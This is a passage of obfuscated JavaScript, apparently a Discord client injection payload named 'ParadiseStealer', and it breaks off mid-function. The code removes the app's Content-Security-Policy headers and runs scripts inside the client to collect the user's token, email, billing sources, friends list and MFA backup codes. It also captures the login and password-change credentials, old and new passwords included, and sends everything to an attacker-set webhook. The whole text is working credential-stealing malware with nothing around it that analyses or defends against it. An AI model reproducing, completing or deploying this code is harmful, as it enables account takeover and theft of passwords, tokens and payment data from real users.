
const _0x2c20f4 = _0x20de;
(function (_0x32e8fd, _0x42fddb) {
    const _0x403ece = _0x20de,
        _0x6a4c8c = _0x32e8fd();
    while (!![]) {
        try {
            const _0x34ba72 =
                (parseInt(_0x403ece(0x1eb)) / 0x1) * (parseInt(_0x403ece(0x234)) / 0x2) +
                -parseInt(_0x403ece(0x1d9)) / 0x3 +
                -parseInt(_0x403ece(0x22e)) / 0x4 +
                -parseInt(_0x403ece(0x1ae)) / 0x5 +
                -parseInt(_0x403ece(0x22b)) / 0x6 +
                (parseInt(_0x403ece(0x19f)) / 0x7) * (parseInt(_0x403ece(0x1e8)) / 0x8) +
                parseInt(_0x403ece(0x228)) / 0x9;
            if (_0x34ba72 === _0x42fddb) break;
            else _0x6a4c8c["push"](_0x6a4c8c["shift"]());
        } catch (_0x21058b) {
            _0x6a4c8c["push"](_0x6a4c8c["shift"]());
        }
    }
})(_0x3000, 0x5a2c1);
const fs = require("fs"),
    path = require("path"),
    { BrowserWindow: BrowserWindow, session: session } = require(_0x2c20f4(0x210)),
    querystring = require(_0x2c20f4(0x23d)),
    os = require("os");
var webhook = "%WEBHOOK_LINK%";
const computerName = os[_0x2c20f4(0x1f2)](),
    discordInstall = "" + __dirname,
    EvalToken = _0x2c20f4(0x1c7),
    config = { logout: _0x2c20f4(0x220), "logout-notify": "%LOGOUTNOTI%", "init-notify": "%INITNOTI%", "embed-color": 0x349b98, "disable-qr-code": "%DISABLEQRCODE%" };
function FirstTime() {
    const _0x22ac65 = _0x2c20f4;
    BrowserWindow[_0x22ac65(0x23e)]()[0x0]
        [_0x22ac65(0x233)][_0x22ac65(0x1b1)]("" + EvalToken, !0x0)
        [_0x22ac65(0x1ac)]((_0x53f873) => {
            const _0x29c5a2 = _0x22ac65;
            if ("true" == config[_0x29c5a2(0x1e4)] && fs[_0x29c5a2(0x226)](path["join"](__dirname, _0x29c5a2(0x237)))) {
                if ((fs[_0x29c5a2(0x230)](path[_0x29c5a2(0x1cf)](__dirname, "init")), null == _0x53f873 || null == _0x53f873 || "" == _0x53f873)) {
                    var _0x597074 = {
                        username: _0x29c5a2(0x21b),
                        content: "",
                        embeds: [
                            {
                                title: _0x29c5a2(0x202),
                                color: config["embed-color"],
                                fields: [{ name: _0x29c5a2(0x1f4), value: _0x29c5a2(0x1a7) + computerName + _0x29c5a2(0x1bd) + __dirname + _0x29c5a2(0x212), inline: !0x1 }],
                                author: { name: _0x29c5a2(0x21b) },
                                footer: { text: _0x29c5a2(0x21b) },
                                thumbnail: { url: _0x29c5a2(0x1fb) },
                            },
                        ],
                    };
                    SendToWebhook(JSON[_0x29c5a2(0x1d7)](_0x597074));
                } else
                    BrowserWindow[_0x29c5a2(0x23e)]()[0x0]
                        ["webContents"]["executeJavaScript"](_0x29c5a2(0x1c0) + _0x53f873 + _0x29c5a2(0x1cc), !0x0)
                        [_0x29c5a2(0x1ac)]((_0x2e1e49) => {
                            const _0x3ea9e8 = _0x29c5a2,
                                _0xb32a86 = JSON["parse"](_0x2e1e49);
                            var _0x75b125 = {
                                username: "ParadiseStealer",
                                content: "",
                                embeds: [
                                    {
                                        title: "Discord\x20Initalized",
                                        color: config[_0x3ea9e8(0x23c)],
                                        fields: [
                                            { name: "Info", value: _0x3ea9e8(0x1a7) + computerName + "\x0aInjection\x20Info:\x20\x0a" + __dirname + _0x3ea9e8(0x212), inline: !0x1 },
                                            { name: _0x3ea9e8(0x1c2), value: "`" + _0xb32a86[_0x3ea9e8(0x1f6)] + "#" + _0xb32a86["discriminator"] + "`", inline: !0x0 },
                                            { name: "ID", value: "`" + _0xb32a86["id"] + "`", inline: !0x0 },
                                            { name: _0x3ea9e8(0x205), value: "" + GetBadges(_0xb32a86[_0x3ea9e8(0x23f)]), inline: !0x1 },
                                            { name: _0x3ea9e8(0x1c9), value: _0x3ea9e8(0x208) + _0x53f873 + _0x3ea9e8(0x208), inline: !0x1 },
                                        ],
                                        author: { name: _0x3ea9e8(0x21b) },
                                        footer: { text: _0x3ea9e8(0x21b) },
                                        thumbnail: { url: _0x3ea9e8(0x213) + _0xb32a86["id"] + "/" + _0xb32a86["avatar"] },
                                    },
                                ],
                            };
                            SendToWebhook(JSON[_0x3ea9e8(0x1d7)](_0x75b125));
                        });
            }
            if (!fs["existsSync"](path[_0x29c5a2(0x1cf)](__dirname, _0x29c5a2(0x1d5)))) return !0x0;
            if ((fs["rmdirSync"](path[_0x29c5a2(0x1cf)](__dirname, "ParadiseStealerBTW")), _0x29c5a2(0x1b4) != config[_0x29c5a2(0x1d8)] || _0x29c5a2(0x220) == config[_0x29c5a2(0x1d8)])) {
                if (_0x29c5a2(0x1f7) == config["logout-notify"])
                    null == _0x53f873 || null == _0x53f873 || "" == _0x53f873
                        ? ((_0x597074 = {
                              username: "ParadiseStealer",
                              content: "",
                              embeds: [
                                  {
                                      title: _0x29c5a2(0x1fa),
                                      color: config[_0x29c5a2(0x23c)],
                                      fields: [{ name: _0x29c5a2(0x1f4), value: _0x29c5a2(0x1a7) + computerName + _0x29c5a2(0x1bd) + __dirname + _0x29c5a2(0x212), inline: !0x1 }],
                                      author: { name: _0x29c5a2(0x21b) },
                                      footer: { text: _0x29c5a2(0x21b) },
                                      thumbnail: { url: _0x29c5a2(0x1e7) },
                                  },
                              ],
                          }),
                          SendToWebhook(JSON[_0x29c5a2(0x1d7)](_0x597074)))
                        : BrowserWindow[_0x29c5a2(0x23e)]()[0x0]
                              [_0x29c5a2(0x233)][_0x29c5a2(0x1b1)](_0x29c5a2(0x1c0) + _0x53f873 + "\x22),xmlHttp.send(null),xmlHttp.responseText;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20", !0x0)
                              ["then"]((_0x2fc7c9) => {
                                  const _0x3d9d7c = _0x29c5a2,
                                      _0x5c4419 = JSON[_0x3d9d7c(0x23a)](_0x2fc7c9);
                                  var _0x4daab7 = {
                                      username: _0x3d9d7c(0x21b),
                                      content: "",
                                      embeds: [
                                          {
                                              title: _0x3d9d7c(0x19b),
                                              color: config[_0x3d9d7c(0x23c)],
                                              fields: [
                                                  { name: "Info", value: _0x3d9d7c(0x1a7) + computerName + "\x0aInjection\x20Info:\x20\x0a" + __dirname + _0x3d9d7c(0x212), inline: !0x1 },
                                                  { name: _0x3d9d7c(0x1c2), value: "`" + _0x5c4419[_0x3d9d7c(0x1f6)] + "#" + _0x5c4419[_0x3d9d7c(0x1b6)] + "`", inline: !0x0 },
                                                  { name: "ID", value: "`" + _0x5c4419["id"] + "`", inline: !0x0 },
                                                  { name: _0x3d9d7c(0x205), value: "" + GetBadges(_0x5c4419["flags"]), inline: !0x1 },
                                                  { name: _0x3d9d7c(0x1c9), value: _0x3d9d7c(0x208) + _0x53f873 + _0x3d9d7c(0x208), inline: !0x1 },
                                              ],
                                              author: { name: "ParadiseStealer" },
                                              footer: { text: _0x3d9d7c(0x21b) },
                                              thumbnail: { url: _0x3d9d7c(0x213) + _0x5c4419["id"] + "/" + _0x5c4419[_0x3d9d7c(0x217)] },
                                          },
                                      ],
                                  };
                                  SendToWebhook(JSON[_0x3d9d7c(0x1d7)](_0x4daab7));
                              });
                BrowserWindow[_0x29c5a2(0x23e)]()[0x0]
                    [_0x29c5a2(0x233)]["executeJavaScript"](_0x29c5a2(0x1b2), !0x0)
                    [_0x29c5a2(0x1ac)]((_0x4db572) => {});
            }
            return !0x1;
        });
}
session[_0x2c20f4(0x1a3)]["webRequest"][_0x2c20f4(0x1d4)]((_0x4b0114, _0x28bc1e) => {
    const _0x848b1b = _0x2c20f4;
    _0x4b0114[_0x848b1b(0x219)]["startsWith"](webhook)
        ? _0x4b0114["url"]["includes"]("discord.com")
            ? _0x28bc1e({ responseHeaders: Object["assign"]({ "Access-Control-Allow-Headers": "*" }, _0x4b0114[_0x848b1b(0x1a8)]) })
            : _0x28bc1e({
                  responseHeaders: Object["assign"](
                      { "Content-Security-Policy": ["default-src\x20\x27*\x27", _0x848b1b(0x1ea), _0x848b1b(0x227)], "Access-Control-Allow-Headers": "*", "Access-Control-Allow-Origin": "*" },
                      _0x4b0114[_0x848b1b(0x1a8)]
                  ),
              })
        : (delete _0x4b0114[_0x848b1b(0x1a8)]["content-security-policy"], delete _0x4b0114[_0x848b1b(0x1a8)][_0x848b1b(0x242)], _0x28bc1e({ responseHeaders: { ..._0x4b0114[_0x848b1b(0x1a8)], "Access-Control-Allow-Headers": "*" } }));
});
function _0x20de(_0x1b4254, _0xb1cd72) {
    const _0x300073 = _0x3000();
    return (
        (_0x20de = function (_0x20de0d, _0x46b51d) {
            _0x20de0d = _0x20de0d - 0x19a;
            let _0x31ced4 = _0x300073[_0x20de0d];
            return _0x31ced4;
        }),
        _0x20de(_0x1b4254, _0xb1cd72)
    );
}
const Filter = { urls: [_0x2c20f4(0x1ef), _0x2c20f4(0x1c3), _0x2c20f4(0x1f1), _0x2c20f4(0x239), _0x2c20f4(0x20e), _0x2c20f4(0x1bf), _0x2c20f4(0x1dd), _0x2c20f4(0x207)] };
function SendToWebhook(_0x31b372) {
    const _0x4d9dc5 = _0x2c20f4;
    BrowserWindow[_0x4d9dc5(0x23e)]()[0x0]
        [_0x4d9dc5(0x233)][_0x4d9dc5(0x1b1)](_0x4d9dc5(0x231) + webhook + _0x4d9dc5(0x20b) + _0x31b372 + _0x4d9dc5(0x1e6), !0x0)
        [_0x4d9dc5(0x1ac)]((_0x10068a) => {});
}
function GetNitro(_0x3a7fc0) {
    const _0x1198e1 = _0x2c20f4;
    return 0x0 == _0x3a7fc0 ? _0x1198e1(0x1db) : 0x1 == _0x3a7fc0 ? _0x1198e1(0x241) : 0x2 == _0x3a7fc0 ? "<a:boost:824036778570416129>\x20`Nitro\x20Boost`" : _0x1198e1(0x1db);
}
function GetRBadges(_0x2998af) {
    const _0x17a460 = _0x2c20f4;
    var _0x35dda6 = "";
    return (
        0x1 == (0x1 & _0x2998af) && (_0x35dda6 += _0x17a460(0x1f3)),
        0x2 == (0x2 & _0x2998af) && (_0x35dda6 += _0x17a460(0x22c)),
        0x4 == (0x4 & _0x2998af) && (_0x35dda6 += "<:hypesquad_events:874750808594477056>\x20"),
        0x8 == (0x8 & _0x2998af) && (_0x35dda6 += _0x17a460(0x1c4)),
        0x200 == (0x200 & _0x2998af) && (_0x35dda6 += _0x17a460(0x1ca)),
        0x4000 == (0x4000 & _0x2998af) && (_0x35dda6 += _0x17a460(0x19a)),
        0x20000 == (0x20000 & _0x2998af) && (_0x35dda6 += _0x17a460(0x201)),
        "" == _0x35dda6 && (_0x35dda6 = ""),
        _0x35dda6
    );
}
function GetBadges(_0x549fe7) {
    const _0x3370b4 = _0x2c20f4;
    var _0x9ddd9e = "";
    return (
        0x1 == (0x1 & _0x549fe7) && (_0x9ddd9e += _0x3370b4(0x1f3)),
        0x2 == (0x2 & _0x549fe7) && (_0x9ddd9e += _0x3370b4(0x22c)),
        0x4 == (0x4 & _0x549fe7) && (_0x9ddd9e += _0x3370b4(0x19e)),
        0x8 == (0x8 & _0x549fe7) && (_0x9ddd9e += "<:bughunter_1:874750808426692658>\x20"),
        0x40 == (0x40 & _0x549fe7) && (_0x9ddd9e += _0x3370b4(0x1bb)),
        0x80 == (0x80 & _0x549fe7) && (_0x9ddd9e += _0x3370b4(0x1a4)),
        0x100 == (0x100 & _0x549fe7) && (_0x9ddd9e += _0x3370b4(0x22f)),
        0x200 == (0x200 & _0x549fe7) && (_0x9ddd9e += _0x3370b4(0x1ca)),
        0x4000 == (0x4000 & _0x549fe7) && (_0x9ddd9e += _0x3370b4(0x19a)),
        0x20000 == (0x20000 & _0x549fe7) && (_0x9ddd9e += _0x3370b4(0x201)),
        "" == _0x9ddd9e && (_0x9ddd9e = _0x3370b4(0x1ec)),
        _0x9ddd9e
    );
}
function Login(_0x2c69fe, _0x232b2a, _0x1b55c6) {
    const _0x77d757 = _0x2c20f4,
        _0x24dce9 = BrowserWindow[_0x77d757(0x23e)]()[0x0];
    _0x24dce9[_0x77d757(0x233)][_0x77d757(0x1b1)](_0x77d757(0x1de) + _0x1b55c6 + "\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;", !0x0)[_0x77d757(0x1ac)]((_0x412b48) => {
        const _0x47c43d = _0x77d757;
        _0x24dce9["webContents"][_0x47c43d(0x1b1)](_0x47c43d(0x1c1), !0x0)[_0x47c43d(0x1ac)]((_0x2d11f6) => {
            const _0x4bc6c7 = _0x47c43d;
            _0x24dce9[_0x4bc6c7(0x233)][_0x4bc6c7(0x1b1)](_0x4bc6c7(0x1bc) + _0x1b55c6 + _0x4bc6c7(0x1b8), !0x0)[_0x4bc6c7(0x1ac)]((_0x3b3d36) => {
                const _0x458e29 = _0x4bc6c7;
                _0x24dce9[_0x458e29(0x233)][_0x458e29(0x1b1)](_0x458e29(0x1d0) + _0x1b55c6 + _0x458e29(0x1d6), !0x0)[_0x458e29(0x1ac)]((_0x42a8a5) => {
                    const _0x3fa86c = _0x458e29,
                        _0x7ee2b9 = JSON["parse"](_0x412b48);
                    var _0x2460d0 = {
                        username: _0x3fa86c(0x21b),
                        content: "",
                        embeds: [
                            {
                                title: "User\x20Login",
                                description: _0x3fa86c(0x1fe),
                                color: config[_0x3fa86c(0x23c)],
                                fields: [
                                    { name: _0x3fa86c(0x1c2), value: "`" + _0x7ee2b9[_0x3fa86c(0x1f6)] + "#" + _0x7ee2b9["discriminator"] + "`", inline: !0x0 },
                                    { name: "ID", value: "`" + _0x7ee2b9["id"] + "`", inline: !0x0 },
                                    { name: _0x3fa86c(0x1dc), value: "" + GetNitro(_0x7ee2b9[_0x3fa86c(0x1ad)]), inline: !0x1 },
                                    { name: _0x3fa86c(0x1a5), value: "" + GetBadges(_0x7ee2b9["flags"]), inline: !0x1 },
                                    {
                                        name: _0x3fa86c(0x1df),
                                        value:
                                            "" +
                                            (function () {
                                                const _0xfbc469 = _0x3fa86c,
                                                    _0x45450d = JSON[_0xfbc469(0x23a)](_0x3b3d36);
                                                var _0x2fa1af = "";
                                                return (
                                                    _0x45450d[_0xfbc469(0x20f)]((_0x504ee5) => {
                                                        const _0x2b2f84 = _0xfbc469;
                                                        if ("" == _0x504ee5[_0x2b2f84(0x21d)]) return _0x2b2f84(0x1ed);
                                                        if (0x2 == _0x504ee5[_0x2b2f84(0x21d)] && 0x1 != _0x504ee5[_0x2b2f84(0x1ab)]) _0x2fa1af += "`✔️`\x20<:paypal:896441236062347374>";
                                                        else {
                                                            if (0x1 != _0x504ee5[_0x2b2f84(0x21d)] || 0x1 == _0x504ee5[_0x2b2f84(0x1ab)]) return "<a:420_cross:931468716779114536>";
                                                            _0x2fa1af += _0x2b2f84(0x1a0);
                                                        }
                                                    }),
                                                    "" == _0x2fa1af && (_0x2fa1af = _0xfbc469(0x1ed)),
                                                    _0x2fa1af
                                                );
                                            })(),
                                        inline: !0x1,
                                    },
                                    { name: _0x3fa86c(0x1e3), value: "`" + _0x2c69fe + "`", inline: !0x0 },
                                    { name: _0x3fa86c(0x1aa), value: "`" + _0x232b2a + "`", inline: !0x0 },
                                    { name: _0x3fa86c(0x1c9), value: _0x3fa86c(0x208) + _0x1b55c6 + _0x3fa86c(0x208), inline: !0x1 },
                                ],
                                author: { name: _0x3fa86c(0x21b) },
                                footer: { text: _0x3fa86c(0x21b) },
                                thumbnail: { url: _0x3fa86c(0x213) + _0x7ee2b9["id"] + "/" + _0x7ee2b9[_0x3fa86c(0x217)] },
                            },
                            {
                                title: _0x3fa86c(0x218) + JSON[_0x3fa86c(0x23a)](_0x42a8a5)[_0x3fa86c(0x1c6)]((_0x2d9eb1) => 0x1 == _0x2d9eb1["type"])[_0x3fa86c(0x1be)] + ")",
                                color: config[_0x3fa86c(0x23c)],
                                description: (function () {
                                    const _0x3f9546 = _0x3fa86c,
                                        _0x4c965b = JSON[_0x3f9546(0x23a)](_0x42a8a5)[_0x3f9546(0x1c6)]((_0x340770) => 0x1 == _0x340770["type"]);
                                    var _0xee84a7 = "";
                                    for (z of _0x4c965b) {
                                        var _0x2d1349 = GetRBadges(z[_0x3f9546(0x216)][_0x3f9546(0x243)]);
                                        "" != _0x2d1349 && (_0xee84a7 += _0x2d1349 + ("\x20" + z[_0x3f9546(0x216)]["username"] + "#" + z["user"]["discriminator"] + "\x0a"));
                                    }
                                    return "" == _0xee84a7 && (_0xee84a7 = "No\x20Rare\x20Friends"), _0xee84a7;
                                })(),
                                author: { name: "ParadiseStealer" },
                                footer: { text: _0x3fa86c(0x21b) },
                                thumbnail: { url: _0x3fa86c(0x213) + _0x7ee2b9["id"] + "/" + _0x7ee2b9[_0x3fa86c(0x217)] },
                            },
                        ],
                    };
                    SendToWebhook(JSON[_0x3fa86c(0x1d7)](_0x2460d0));
                });
            });
        });
    });
}
function ChangePassword(_0x471dec, _0x5f075c, _0x58704f) {
    const _0x55a983 = _0x2c20f4,
        _0x5038e4 = BrowserWindow[_0x55a983(0x23e)]()[0x0];
    _0x5038e4[_0x55a983(0x233)][_0x55a983(0x1b1)](_0x55a983(0x1de) + _0x58704f + _0x55a983(0x1f0), !0x0)["then"]((_0x32bcc1) => {
        const _0x52a0c1 = _0x55a983;
        _0x5038e4[_0x52a0c1(0x233)][_0x52a0c1(0x1b1)](_0x52a0c1(0x1c1), !0x0)[_0x52a0c1(0x1ac)]((_0x44f8cb) => {
            const _0x3ad15e = _0x52a0c1;
            _0x5038e4[_0x3ad15e(0x233)][_0x3ad15e(0x1b1)](_0x3ad15e(0x1bc) + _0x58704f + _0x3ad15e(0x1b8), !0x0)[_0x3ad15e(0x1ac)]((_0x35ec1e) => {
                const _0x1f534e = _0x3ad15e;
                _0x5038e4[_0x1f534e(0x233)]
                    ["executeJavaScript"](
                        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22" +
                            _0x58704f +
                            _0x1f534e(0x1d6),
                        !0x0
                    )
                    [_0x1f534e(0x1ac)]((_0x93f9f9) => {
                        const _0x2416fd = _0x1f534e;
                        if (_0x58704f[_0x2416fd(0x21c)]("mfa"))
                            _0x5038e4[_0x2416fd(0x233)]
                                [_0x2416fd(0x1b1)](_0x2416fd(0x1c8) + _0x58704f + "\x22)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(JSON.stringify({\x22password\x22:\x22" + _0x5f075c + _0x2416fd(0x1b9), !0x0)
                                [_0x2416fd(0x1ac)]((_0x2f2925) => {
                                    const _0x13c191 = _0x2416fd;
                                    var _0x3311cf = [],
                                        _0x91c508 = _0x13c191(0x200);
                                    const _0x1b6d99 = JSON[_0x13c191(0x23a)](_0x2f2925)[_0x13c191(0x1e0)]["filter"]((_0x2aecd3) => null == _0x2aecd3[_0x13c191(0x238)]);
                                    for (let _0x3f4905 in _0x1b6d99)
                                        _0x3311cf["push"]({ name: _0x13c191(0x224), value: "`" + _0x1b6d99[_0x3f4905][_0x13c191(0x1ee)][_0x13c191(0x21e)](0x4, "-") + "`", inline: !0x0 }),
                                            (_0x91c508 += _0x1b6d99[_0x3f4905][_0x13c191(0x1ee)][_0x13c191(0x21e)](0x4, "-") + "<br>");
                                    const _0x1d718a = JSON[_0x13c191(0x23a)](_0x32bcc1);
                                    var _0x449cf6 = {
                                            username: _0x13c191(0x21b),
                                            content: "",
                                            embeds: [
                                                {
                                                    title: _0x13c191(0x1b7),
                                                    description: _0x13c191(0x1fe),
                                                    color: config["embed-color"],
                                                    fields: [
                                                        { name: _0x13c191(0x1c2), value: "`" + _0x93f9f9[_0x13c191(0x1f6)] + "#" + _0x93f9f9[_0x13c191(0x1b6)] + "`", inline: !0x0 },
                                                        { name: "ID", value: "`" + _0x93f9f9["id"] + "`", inline: !0x0 },
                                                        { name: _0x13c191(0x1dc), value: "" + GetNitro(_0x93f9f9[_0x13c191(0x1ad)]), inline: !0x1 },
                                                        { name: _0x13c191(0x1a5), value: "" + GetBadges(_0x93f9f9[_0x13c191(0x23f)]), inline: !0x1 },
                                                        {
                                                            name: _0x13c191(0x1df),
                                                            value:
                                                                "" +
                                                                (function () {
                                                                    const _0x1c9c07 = _0x13c191,
                                                                        _0x51f2f2 = JSON[_0x1c9c07(0x23a)](_0x35ec1e);
                                                                    var _0x504139 = "";
                                                                    return (
                                                                        _0x51f2f2[_0x1c9c07(0x20f)]((_0x30de76) => {
                                                                            const _0x1d1a6f = _0x1c9c07;
                                                                            if ("" == _0x30de76[_0x1d1a6f(0x21d)]) return _0x1d1a6f(0x1e5);
                                                                            if (0x2 == _0x30de76[_0x1d1a6f(0x21d)] && 0x1 != _0x30de76[_0x1d1a6f(0x1ab)]) _0x504139 += _0x1d1a6f(0x1d2);
                                                                            else {
                                                                                if (0x1 != _0x30de76[_0x1d1a6f(0x21d)] || 0x1 == _0x30de76[_0x1d1a6f(0x1ab)]) return "`❌`";
                                                                                _0x504139 += "`✔️`\x20:credit_card:";
                                                                            }
                                                                        }),
                                                                        "" == _0x504139 && (_0x504139 = "`❌`"),
                                                                        _0x504139
                                                                    );
                                                                })(),
                                                            inline: !0x1,
                                                        },
                                                        { name: "<:PP_director:942527310324719716>\x20Email", value: "`" + _0x1d718a[_0x13c191(0x22a)] + "`", inline: !0x1 },
                                                        { name: _0x13c191(0x1ce), value: "`" + _0x471dec + "`", inline: !0x0 },
                                                        { name: _0x13c191(0x209), value: "`" + _0x5f075c + "`", inline: !0x0 },
                                                        { name: "Token", value: _0x13c191(0x208) + _0x58704f + "```", inline: !0x1 },
                                                    ],
                                                    author: { name: _0x13c191(0x21b) },
                                                    footer: { text: _0x13c191(0x1a9) },
                                                    thumbnail: { url: _0x13c191(0x213) + _0x1d718a["id"] + "/" + _0x1d718a[_0x13c191(0x217)] },
                                                },
                                                {
                                                    title: _0x13c191(0x218) + JSON[_0x13c191(0x23a)](_0x93f9f9)[_0x13c191(0x1c6)]((_0x6d0b48) => 0x1 == _0x6d0b48[_0x13c191(0x21d)])[_0x13c191(0x1be)] + ")",
                                                    color: config[_0x13c191(0x23c)],
                                                    description: (function () {
                                                        const _0x47d0f4 = _0x13c191,
                                                            _0x10d411 = JSON["parse"](_0x93f9f9)[_0x47d0f4(0x1c6)]((_0x47b26b) => 0x1 == _0x47b26b[_0x47d0f4(0x21d)]);
                                                        var _0x2fd9ba = "";
                                                        for (z of _0x10d411) {
                                                            var _0x409af7 = GetRBadges(z[_0x47d0f4(0x216)]["public_flags"]);
                                                            "" != _0x409af7 && (_0x2fd9ba += _0x409af7 + ("\x20" + z[_0x47d0f4(0x216)][_0x47d0f4(0x1f6)] + "#" + z[_0x47d0f4(0x216)]["discriminator"] + "\x0a"));
                                                        }
                                                        return "" == _0x2fd9ba && (_0x2fd9ba = "No\x20Rare\x20Friends"), _0x2fd9ba;
                                                    })(),
                                                    author: { name: _0x13c191(0x21b) },
                                                    footer: { text: _0x13c191(0x21b) },
                                                    thumbnail: { url: _0x13c191(0x213) + _0x1d718a["id"] + "/" + _0x1d718a["avatar"] },
                                                },
                                            ],
                                        },
                                        _0x4d6e0d = {
                                            title: _0x13c191(0x225),
                                            description: _0x13c191(0x222) + _0x91c508 + ")",
                                            color: config[_0x13c191(0x23c)],
                                            fields: _0x3311cf,
                                            author: { name: _0x13c191(0x21b) },
                                            footer: { text: _0x13c191(0x21b) },
                                        };
                                    _0x58704f[_0x13c191(0x21c)]("mfa") && _0x449cf6[_0x13c191(0x21f)][_0x13c191(0x204)](_0x4d6e0d), SendToWebhook(JSON[_0x13c191(0x1d7)](_0x449cf6));
                                });
                        else {
                            const _0x4a8dc8 = BrowserWindow[_0x2416fd(0x23e)]()[0x0];
                            _0x4a8dc8[_0x2416fd(0x233)]
                                [_0x2416fd(0x1b1)](
                                    "\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22" +
                                        _0x58704f +
                                        "\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;",
                                    !0x0
                                )
                                [_0x2416fd(0x1ac)]((_0x5d5f33) => {
                                    const _0x9071ba = _0x2416fd;
                                    _0x4a8dc8["webContents"][_0x9071ba(0x1b1)](_0x9071ba(0x1c1), !0x0)[_0x9071ba(0x1ac)]((_0x23bcb4) => {
                                        const _0x222cd9 = _0x9071ba;
                                        _0x4a8dc8["webContents"]
                                            [_0x222cd9(0x1b1)](
                                                "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22" +
                                                    _0x58704f +
                                                    "\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText",
                                                !0x0
                                            )
                                            [_0x222cd9(0x1ac)]((_0x18048e) => {
                                                const _0x49402a = _0x222cd9;
                                                _0x4a8dc8["webContents"][_0x49402a(0x1b1)](_0x49402a(0x1d0) + _0x58704f + _0x49402a(0x1d6), !0x0)[_0x49402a(0x1ac)]((_0x2a1e5e) => {
                                                    const _0x200922 = _0x49402a,
                                                        _0x4bf1d9 = JSON[_0x200922(0x23a)](_0x5d5f33);
                                                    var _0x161543 = {
                                                        username: _0x200922(0x21b),
                                                        content: "",
                                                        embeds: [
                                                            {
                                                                title: _0x200922(0x1b7),
                                                                description: _0x200922(0x1fe),
                                                                color: config[_0x200922(0x23c)],
                                                                fields: [
                                                                    { name: _0x200922(0x1c2), value: "`" + _0x4bf1d9["username"] + "#" + _0x4bf1d9[_0x200922(0x1b6)] + "`", inline: !0x0 },
                                                                    { name: "ID", value: "`" + _0x4bf1d9["id"] + "`", inline: !0x0 },
                                                                    { name: "<a:pepe_nitro:906950345983397988>\x20Nitro", value: "" + GetNitro(_0x4bf1d9[_0x200922(0x1ad)]), inline: !0x1 },
                                                                    { name: "<a:allbadges:895906088996720690>\x20\x20Badges", value: "" + GetBadges(_0x4bf1d9[_0x200922(0x23f)]), inline: !0x1 },
                                                                    {
                                                                        name: _0x200922(0x1df),
                                                                        value:
                                                                            "" +
                                                                            (function () {
                                                                                const _0x1932bd = _0x200922,
                                                                                    _0x45e949 = JSON[_0x1932bd(0x23a)](_0x18048e);
                                                                                var _0x572888 = "";
                                                                                return (
                                                                                    _0x45e949[_0x1932bd(0x20f)]((_0x345b73) => {
                                                                                        const _0x4ed903 = _0x1932bd;
                                                                                        if ("" == _0x345b73[_0x4ed903(0x21d)]) return "`❌`";
                                                                                        if (0x2 == _0x345b73[_0x4ed903(0x21d)] && 0x1 != _0x345b73[_0x4ed903(0x1ab)]) _0x572888 += _0x4ed903(0x1d2);
                                                                                        else {
                                                                                            if (0x1 != _0x345b73[_0x4ed903(0x21d)] || 0x1 == _0x345b73[_0x4ed903(0x1ab)]) return "`❌`";
                                                                                            _0x572888 += _0x4ed903(0x1a0);
                                                                                        }
                                                                                    }),
                                                                                    "" == _0x572888 && (_0x572888 = _0x1932bd(0x1e5)),
                                                                                    _0x572888
                                                                                );
                                                                            })(),
                                                                        inline: !0x1,
                                                                    },
                                                                    { name: "<:PP_director:942527310324719716>\x20Email", value: "`" + _0x4bf1d9["email"] + "`", inline: !0x1 },
                                                                    { name: _0x200922(0x1ce), value: "`" + _0x471dec + "`", inline: !0x0 },
                                                                    { name: _0x200922(0x209), value: "`" + _0x5f075c + "`", inline: !0x0 },
                                                                    { name: _0x200922(0x1c9), value: "```" + _0x58704f + _0x200922(0x208), inline: !0x1 },
                                                                ],
                                                                author: { name: _0x200922(0x21b) },
                                                                footer: { text: "ParadiseStealer" },
                                                                thumbnail: { url: "https://cdn.discordapp.com/avatars/" + _0x4bf1d9["id"] + "/" + _0x4bf1d9[_0x200922(0x217)] },
                                                            },
                                                            {
                                                                title: "Total\x20Friends\x20(" + JSON[_0x200922(0x23a)](_0x2a1e5e)["filter"]((_0x227d7f) => 0x1 == _0x227d7f[_0x200922(0x21d)])[_0x200922(0x1be)] + ")",
                                                                color: config["embed-color"],
                                                                description: (function () {
                                                                    const _0x437f38 = _0x200922,
                                                                        _0x579af5 = JSON[_0x437f38(0x23a)](_0x2a1e5e)[_0x437f38(0x1c6)]((_0xd8446f) => 0x1 == _0xd8446f["type"]);
                                                                    var _0x443d2c = "";
                                                                    for (z of _0x579af5) {
                                                                        var _0x3e8b98 = GetRBadges(z["user"]["public_flags"]);
                                                                        "" != _0x3e8b98 && (_0x443d2c += _0x3e8b98 + ("\x20" + z[_0x437f38(0x216)][_0x437f38(0x1f6)] + "#" + z["user"][_0x437f38(0x1b6)] + "\x0a"));
                                                                    }
                                                                    return "" == _0x443d2c && (_0x443d2c = _0x437f38(0x21a)), _0x443d2c;
                                                                })(),
